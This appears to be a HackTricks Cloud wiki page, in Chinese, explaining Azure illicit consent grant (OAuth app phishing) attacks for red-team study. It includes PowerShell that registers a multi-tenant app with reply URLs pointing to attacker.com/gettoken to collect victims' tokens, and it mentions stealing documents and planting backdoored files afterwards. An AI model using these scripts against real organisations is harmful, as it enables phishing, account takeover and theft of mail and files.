# Az - Illicit Consent Grant

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## OAuth 应用钓鱼

**Azure 应用程序**请求访问**用户数据**的权限（基本信息，但也包括访问文档、发送电子邮件等）。\
如果**允许**，普通用户只能授予**“低影响”权限**的同意。在**所有其他**情况下，**需要管理员同意**。\
`GA`、`ApplicationAdministrator`、`CloudApplication` `Administrator`和包括`授予应用程序权限的权限`的自定义角色可以提供租户范围的同意。

只有**不需要管理员同意**的权限被归类为**低影响**。这些是**基本登录所需的权限**，包括openid、profile、email、User.Read和offline\_access。如果一个**组织****允许**用户对**所有应用程序**进行同意，员工可以授予应用程序**读取其个人资料中的上述信息**的权限。

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

因此，攻击者可以准备一个**恶意应用**，并通过**钓鱼**使用户**接受该应用并窃取其数据**。

### 2 种非法同意授予攻击类型

* **未认证**：从外部帐户创建一个具有`User.Read`和`User.ReadBasic.All`权限的应用程序，例如，钓鱼用户，您将能够访问目录信息。
* 这要求被钓鱼的用户能够接受来自外部环境的OAuth应用！
* **已认证**：在拥有足够权限的主体被攻陷后，在帐户内创建一个应用程序并钓鱼一些可以接受特权OAuth权限的特权用户。
* 在这种情况下，您已经可以访问目录的信息，因此权限`User.ReadBasic.All`不再有趣。
* 您可能对**需要管理员授予的权限**感兴趣，因为普通用户无法授予OAuth应用任何权限，这就是为什么您需要**仅钓鱼这些用户**（稍后将详细介绍哪些角色/权限授予此特权）

### 检查用户是否允许同意

以下 PowerShell 命令用于检查 Azure Active Directory (Azure AD) 中用户的同意配置，关于他们是否能够对应用程序进行同意：
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **禁用用户同意**：此设置禁止用户向应用程序授予权限。用户不允许对应用程序进行同意。
* **用户可以对经过验证的发布者或您组织的应用程序进行同意，但仅限于您选择的权限**：此设置允许所有用户仅对由经过验证的发布者发布的应用程序和在您自己的租户中注册的应用程序进行同意。通过仅允许特定权限的同意，增加了一层控制。
* **用户可以对所有应用程序进行同意**：此设置更为宽松，允许所有用户对任何应用程序的权限进行同意，只要这些权限不需要管理同意。
* **自定义应用程序同意策略**：此设置表明已制定自定义策略，可以根据特定的组织要求进行调整，并可能涉及基于应用程序发布者、应用程序请求的权限和其他因素的组合限制。

## **理解非法同意授予攻击**

在非法同意授予攻击中，攻击者欺骗最终用户向在Azure中注册的恶意应用程序授予权限。这是通过使应用程序看起来合法来实现的，导致受害者在不知情的情况下点击“接受”按钮。因此，Azure AD向攻击者的网站发放令牌，使他们能够访问和操纵受害者的数据，例如读取或发送电子邮件和访问文件，而无需组织帐户。

## **攻击流程概述**

该攻击涉及针对一个通用公司的几个步骤。以下是可能的展开方式：

1. **域名注册和应用程序托管**：攻击者注册一个类似可信网站的域名，例如“safedomainlogin.com”。在该域名下，创建一个子域名（例如“companyname.safedomainlogin.com”）来托管一个旨在捕获授权代码和请求访问令牌的应用程序。
2. **在Azure AD中注册应用程序**：攻击者随后在其Azure AD租户中注册一个多租户应用程序，以目标公司的名称命名，以显得合法。他们将应用程序的重定向URL配置为指向托管恶意应用程序的子域名。
3. **设置权限**：攻击者为应用程序设置各种API权限（例如`Mail.Read`、`Notes.Read.All`、`Files.ReadWrite.All`、`User.ReadBasic.All`、`User.Read`）。一旦用户授予这些权限，攻击者就可以代表用户提取敏感信息。
4. **分发恶意链接**：攻击者制作一个包含恶意应用程序客户端ID的链接，并与目标用户分享，欺骗他们授予同意。

## **利用工具进行攻击**

该攻击可以使用像[**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)这样的工具来促进。

### 攻击前准备：

如果攻击者对受害组织中的某个用户有一定程度的访问权限，他们可能会检查组织的政策是否允许用户接受应用程序：
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
为了执行攻击，攻击者需要在他们的 Azure 租户中创建一个 **新应用**（在应用注册中），并配置以下权限：

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` 位于 `Microsoft Graph` 的 `Delegated permissions` 中。（应用权限始终需要额外的批准）。

* `User.ReadBasic.All` 是允许您 **读取组织中所有用户信息** 的权限（如果获得批准）。
* 请记住，只有 `GA`、`ApplicationAdministrator`、`CloudApplication` `Administrator` 和包括 `授予应用权限的权限` 的自定义角色可以提供租户范围的同意。因此，如果您希望他批准一个 **需要管理员同意的应用**，您应该 **钓鱼一个具有这些角色的用户**。

您还可以通过 cli 创建一个应用： 

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

查看 [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) 了解如何配置它。

{% hint style="warning" %}
请注意，获得的 **access token** 将用于 **graph endpoint**，其范围为：`User.Read` 和 `User.ReadBasic.All`（请求的权限）。您将无法执行其他操作（但这些足以 **下载有关组织中所有用户的信息**）。
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

您也可以使用此工具执行此攻击。

## Post-Exploitation

一旦您获得用户访问权限，您可以执行诸如窃取敏感文档甚至上传后门文档文件等操作。

## References

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
学习和实践 AWS Hacking：<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
学习和实践 GCP Hacking： <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
